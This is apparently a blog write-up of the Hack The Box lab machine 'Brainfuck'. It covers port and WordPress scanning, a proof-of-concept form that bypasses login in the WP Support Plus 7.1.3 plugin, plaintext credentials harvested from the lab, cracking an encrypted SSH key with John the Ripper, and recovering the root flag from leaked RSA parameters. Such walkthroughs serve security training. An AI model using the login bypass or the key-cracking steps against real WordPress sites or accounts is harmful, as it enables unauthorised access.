---
title: "BrainFuck"
date: 2020-11-14T18:27:23+01:00
draft: false
summary: "With this machine I learned about cryptography how it is used and another way to do privileage  escalation"

---

#### Machine Skills
---

With this machine I learned about cryptography how it is used and another way to do privileage  escalation

-----
#### Step 1 - Enumeration
-----
```bat
    nmap -sC -sV -oA namp 10.10.10.17
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 10:37 EDT
    Nmap scan report for 10.10.10.17
    Host is up (0.095s latency).
    Not shown: 995 filtered ports
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
    |   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
    |_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
    25/tcp  open  smtp     Postfix smtpd
    |_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
    110/tcp open  pop3     Dovecot pop3d
    |_pop3-capabilities: CAPA UIDL SASL(PLAIN) PIPELINING TOP AUTH-RESP-CODE USER RESP-CODES
    143/tcp open  imap     Dovecot imapd
    |_imap-capabilities: more Pre-login ENABLE LITERAL+ have SASL-IR IMAP4rev1 post-login IDLE OK capabilities LOGIN-REFERRALS listed ID AUTH=PLAINA0001
    443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
    |_http-server-header: nginx/1.10.0 (Ubuntu)
    |_http-title: Welcome to nginx!
    | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
    | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb                                            
    | Not valid before: 2017-04-13T11:19:29                                                                                     
    |_Not valid after:  2027-04-11T11:19:29
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |_  http/1.1
    | tls-nextprotoneg: 
    |_  http/1.1
    Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernelI
```
I started the machine with a scan this has shown multiple ports open 443, 22 to name some of the most intersting ones.

Next I look at the webpages to see if there is any information about the software used or anything that may leed to more intersting information. 

![Search pages](/BrainFuck/OtherPage.png)
![Search pages](/BrainFuck/MainPage.png)
##### [Figure 1.1 - Pages for the website ] 

At first I tried searching the ip of the machine with port 443, this did not work and after a bit of searching online and looking at the nmap scan better I found that with ssl you need to add the names to dns server so in my case i had to add 
Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
These two to my machine. To do this I had to modify 
```bat
    cat /etc/hosts

    127.0.0.1 localhost
    127.0.1.1 kali
    10.10.10.17 www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
```
This made it possible to access the webpages.

Next i ran nikto on the machine to find any sub pages but instead I found some email address
```bat
    nikto -h https://brainfuck.htb
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          10.10.10.17
    + Target Hostname:    brainfuck.htb
    + Target Port:        443
    ---------------------------------------------------------------------------
    + SSL Info:        Subject:  /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=**brainfuck.htb/
**emailAddress=orestis@brainfuck.htb**

                    Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                    Issuer:   /C=GR/ST=Attica/L=Athens/O=Brainfuck Ltd./OU=IT/CN=brainfuck.htb/
                    
**emailAddress=orestis@brainfuck.htb**

    + Start Time:         2020-05-25 16:44:44 (GMT-4)
    ---------------------------------------------------------------------------
```
Also after taking a look at the webpages and inspecting the sources i found some wp-content packages which led me to believe the website was made with wordpress. Therefore I had to use the wordpress scanning service that I found online. 
```bat
        wpscan --url https://brainfuck.htb -e u,ap --disable-tls-checks
    _______________________________________________________________
            __          _______   _____
            \ \        / /  __ \ / ____|
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \___|\__,_|_| |_|

            WordPress Security Scanner by the WPScan Team
                            Version 3.8.2
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [+] URL: https://brainfuck.htb/ [10.10.10.17]
    [+] Started: Mon September 12 08:04:26 2020

    Interesting Finding(s):

    [+] Headers
    | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
    | Found By: Headers (Passive Detection)
    | Confidence: 100%

    [+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%
    | References:
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

    [+] https://brainfuck.htb/readme.html
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 60%
    | References:
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
    |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
    | Found By: Rss Generator (Passive Detection)
    |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
    |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>

    [+] WordPress theme in use: proficient
    | Location: https://brainfuck.htb/wp-content/themes/proficient/
    | Last Updated: 2020-07-03T00:00:00.000Z
    | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
    | [!] The version is out of date, the latest version is 3.0.25
    | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
    | Style Name: Proficient
    | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
    | Author: Specia
    | Author URI: https://speciatheme.com/
    |
    | Found By: Css Style In Homepage (Passive Detection)
    |
    | Version: 1.0.6 (80% confidence)
    | Found By: Style (Passive Detection)
    |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: 'Version: 1.0.6'

    [+] Enumerating All Plugins (via Passive Methods)
    [+] Checking Plugin Versions (via Passive and Aggressive Methods)

    [i] Plugin(s) Identified:

    [+] wp-support-plus-responsive-ticket-system
    | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
    | Last Updated: 2019-09-03T07:57:00.000Z
    | [!] The version is out of date, the latest version is 9.1.2
    |
    | Found By: Urls In Homepage (Passive Detection)
    |
    | Version: 7.1.3 (100% confidence)
    | Found By: Readme - Stable Tag (Aggressive Detection)
    |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
    | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
    |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

    [+] Enumerating Users (via Passive and Aggressive Methods)
    Brute Forcing Author IDs - Time: 00:00:03 <=====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:03

    [i] User(s) Identified:

    [+] admin
    | Found By: Author Posts - Display Name (Passive Detection)
    | Confirmed By:
    |  Rss Generator (Passive Detection)
    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    |  Login Error Messages (Aggressive Detection)

    [+] administrator
    | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    | Confirmed By: Login Error Messages (Aggressive Detection)

    [!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

    [+] Finished: Mon Jul  6 08:04:49 2020
    [+] Requests Done: 55
    [+] Cached Requests: 6
    [+] Data Sent: 13.091 KB
    [+] Data Received: 239.483 KB
    [+] Memory used: 215.93 MB
    [+] Elapsed time: 00:00:22
```


### Step 2 -Exploitation
---

This lead to finding the version of wordpress and the next logical step was to look in searchsploit to see if I can find any exploits for this version.

```bat
    searchsploit wp support plus
    ------------------------------------------------------------------------------------------ ---------------------------------
    Exploit Title                                                                            |  Path
    ------------------------------------------------------------------------------------------ ---------------------------------
    WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities  | php/webapps/34589.txt
    WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation    | php/webapps/41006.txt
    WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection           | php/webapps/40939.txt
    ------------------------------------------------------------------------------------------ ---------------------------------
    Shellcodes: No Results
    kali@kali:~$ searchsploit -x pphp/webapps/34589.txt
    Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities
        URL: https://www.exploit-db.com/exploits/34589
        Path: /usr/share/exploitdb/exploits/php/webapps/34589.txt
    File Type: ASCII text, with CRLF line terminators



    kali@kali:~$ searchsploit -x php/webapps/41006.txt
    Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
        URL: https://www.exploit-db.com/exploits/41006
        Path: /usr/share/exploitdb/exploits/php/webapps/4



    What I could find after a bit of more digging was the following code for xss injection.

    2. Proof of Concept
    <form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
            Username: <input type="text" name="username" value="administrator">
            <input type="hidden" name="email" value="sth">
            <input type="hidden" name="action" value="loginGuestFacebook">
            <input type="submit" value="Login">
    </form>
```

After putting that in a file and looking better at it I was able to determine that it was a login page 

![Search pages](/BrainFuck/loginPageExploit.png)
##### [Figure 1.2 - Exploit page] 

After looking online for common wordpress usernames I found that admin is the most common one, 
after entering this in the exploit I got to the admin page 
this was the path to the admin page. This took longer than I would like to admit to find out.

    https://brainfuck.htb/wp-admin/portal

![Search pages](/BrainFuck/Wp_adminPage.png)
##### [Figure 1.3 - Admin page with sntp plugin] 

From the admin page we are able to find a plugin  that is used for smtp, looking at it more in detail it has the credentials to login with email.
As such what we do we get the credentials 
```bat
    orestis@brainfuck.htb | KHGuERB29DNiNE
```


This was fairly easy, the only trick was to know how to change the password view from inspector to plaintext by changeing type=password to type=text.

Next I used thunderbird to login to the actual inbox where I found some other credentials that I did not yet know what to do with them.
```bat
    orestis | kIEnnfEKJ#9UmdO
```
After while I decided to work on the other url that I had, then I realized that was a chat and I was able to use the credentials to log in to a specific admin user that had conversations. 

There we find what looks to be an encrypted conversation.

![Search pages](/BrainFuck/EncryptedCoversation.png)
##### [Figure 1.4 - Encrypted conversation] 

At first I thought it was polish but it was not. As such I had to look online for the solution as I got stuck on this. The solution was to use a special decrypting software with KPA
https://www.boxentriq.com/code-breaking/cipher-identifier <- this link was used for decrypting the text.

After proberly decripting the text what comes out is this 
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa <- A link that downloads ssh key but this was not directly available.

Sadly the rsa is encrypted with a password that is not found in the conversation as such I had to use John the ripper.
For this I found a method online with using a specific tool
```bat
     https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
     python ssh2john id_rsa > brainfuck.txt
```
This creates this file 
```bat
    id_rsa:$ssh2$2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0a50726f632d547970653a20342c454e435259505445440a44454b2d496e666f3a204145532d3132382d4342432c36393034464546313933393737383646373542453244373736324145373338320a0a6d6e6561672f5943593841422b4f4c64726774794b716e72645448776d705747544e573970666848734e7a38436647644178676368556148656f546a2f72682f0a42326e53342b394359424b38495233567435466f37506f5742436a41417757596c782b634b3077314458716133412b424c6c735349304b7773396a65613647690a57316d612f5637576f4a4a2b56344a4e49377566546851794f45554f3736506c594e524d39554546384d414e516d4a4b33374d6439457a753533774a7055715a0a37644b636736414d2f6f3956684f6c7069583753494e543964524b614b65764f6a6f7052627945464d6c6950303148375a6c616857506452526d664358536d510a7a78483949326c47495154745252413372466b744c704e65644e50755a51435373775565633765565674326d63325a7639504d396c43544a7552537a7a56756d0a6f7a3358456e6861476d50316a6d4d6f56425769442b3252726e4c36776e7a396b7373562b74674356306d44393757532b3179645745506543706830364d656d0a644c52324c31757642474a6576386939685033746870316f77764d384867696479664d4332764f427658626341413362444b7652346a737a326f62663541462b0a46767436706d4d756978386862697050313132557335347954762f6879432b4d356731685755756a357934786f766772304c4c6649327047652b4676356c58540a6d637a6e63315a714459356c726c6d577a54767357376837726d394c4b674569486e3967476771694f6c524b6e3546556c2b446c6661414d48576959554b59730a4c534d5676444936773838675a623130324b44326b344e563050364f645849434a414d4561316d534f6b2f4c532f6d4c4f3465304e337745582b4e74675662710a756c396775536c6f626173495835446b4163592b4552336a2b2f5965667079456e59732b2f74665454316f4d2b4252335456536c4a634f72764e6d72497935390a6b724b5674756c7841656a56517a78496d574f554459433934375458753942417368304d4c6f4b747049524c33486362752b7669394c356e6e354c6b684f2f560a67644d794f7941546f7237416d7532786239334f4f3535584b6b42316c697732726c576736734270584d315755676f4d515735304b656f364f306a7a654766410a56776d4d373258626175676d684b573235712f34362f794c34564d4b754479484c3548632b4f763576336251393038702b55726630346470766a39536a427a6e0a736368716f7a6f6763433155664a63436d36636c2b3936374746426133724435594470337832787949563953516477477648305a49637030644b4b6b4d565a740a5558386854717631524f5234436b3847317a4d36576334517148364455714769337472376e597779377778314a4a36575268707957644c2b7375386639364b6e0a463767775a4c745650383764385233754145525a6e78464f394d754f5a55322b50456e4458645343534d76337158394676505959334f504b6273786941792b4d0a775a657a4c4e69703830586d63564a7747555973646e2b69422f55504d64645831324a333059556274772f52333454516952465568574c5446726d4f614c61620a49716c354c2b304a4562655a394f3536446158467150336758684d783878424b555161783265786f5472656f7843493537617842514271546845672f485443790a4951506d485733366d7874632b496c4d444578644c485744376d6e4e75496453686941523662585959534d3345373235667a4c45314d46753435566b484469460a6d7879394556512b7634396b6734794677554e505062734f70704b6337674a57705331592f692b72444b67385a4e56335449623554417149715152675a7170500a4376665052706d4c5552516e766c793839585839374a474a5253474a6862414371554d5a6e66774670785a386150735677736f585279757562343361374774460a39446979436268477546327a59636d4b6a5235454f4f543748736771514963414f4d495735357132464a707148312b505538654966467a6b68555930716f47530a4542466b5a75435079756a594f547976515a657779642b61783733484f49375a486f79384378446b6a5362495879414c79416137497033616764744f506e6d690a3668442b6a7876627078466738696764745a6c683950736649676b4e5a4b3852716e50796d4150437976526d386337765a4648345377516744354658547747510a2d2d2d2d2d454e44205253412050524956415445204b45592d2d2d2d2d0a*1766*0
```
With this file format we can send it to john the ripper
```bat
    john brainfuck.txt — wordlist=/usr/share/wordlists/rockyou.txt
```
Which outputs the following credentials 

    orestis | 3poulakia!

Which can be used to gain a foothold

---
### Step 3 - Foothold
---
```bat
    ssh -i id_rsa orestis@brainfuck.htb
```
when prompted for the password you can use the one that we just discoverd 

In here we find the user flag.
```bat
    orestis@brainfuck:~$ ls -l
    total 20
    -rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
    -rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
    drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
    -rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
    -r-------- 1 orestis orestis   33 Apr 29  2017 user.txt     
```

---
### Step 4 - Privilage Escalation
---

For the root password there was a special way to do it that I had to take from the writeup because I had no idea how to implement it myself.

The encrypt.sage file had a way to get root. 
```bat
    nbits = 1024

    password = open("/root/root.txt").read().strip()
    enc_pass = open("output.txt","w")
    debug = open("debug.txt","w")
    m = Integer(int(password.encode('hex'),16))

    p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
    n = p*q
    phi = (p-1)*(q-1)
    e = ZZ.random_element(phi)
    while gcd(e, phi) != 1:
        e = ZZ.random_element(phi)

    c = pow(m, e, n)
    enc_pass.write('Encrypted Password: '+str(c)+'\n')
    debug.write(str(p)+'\n')
    debug.write(str(q)+'\n')
    debug.write(str(e)+'\n')
```
Apperently sage is a programming library. And from i can understand from this code the file is used to get the actual flag.

After looking around there was a script written just for this 
```bat
    https://gist.githubusercontent.com/intrd/3f6e8f02e16faa54729b9288a8f59582/raw/8c7f3dd980bdbaa42a49e5f25ea62e74fd637b71/rsa_egcd.py


    #!/usr/bin/python
    ## RSA - Given p,q and e.. recover and use private key w/ Extended Euclidean Algorithm - crypto150-what_is_this_encryption @ alexctf 2017
    # @author intrd - http://dann.com.br/ (original script here: http://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e)
    # @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/
    import binascii, base64
    p = 
    q = 
    e = 
    ct =
    def egcd(a, b):
        x,y, u,v = 0,1, 1,0
        while a != 0:
            q, r = b//a, b%a
            m, n = x-u*q, y-v*q
            b,a, x,y, u,v = a,r, u,v, m,n
            gcd = b
        return gcd, x, y
    n = p*q #product of primes
    phi = (p-1)*(q-1) #modular multiplicative inverse
    gcd, a, b = egcd(e, phi) #calling extended euclidean algorithm
    d = a #a is decryption key
    out = hex(d)
    print("d_hex: " + str(out));
    print("n_dec: " + str(d));
    pt = pow(ct, d, n)
    print("pt_dec: " + str(pt))
    out = hex(pt)
    out = str(out[2:-1])
    print "flag"
    print out.decode("hex")

    After finding the right values in the sage file for p q e and ct

    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```
We get the root file contents with the flag.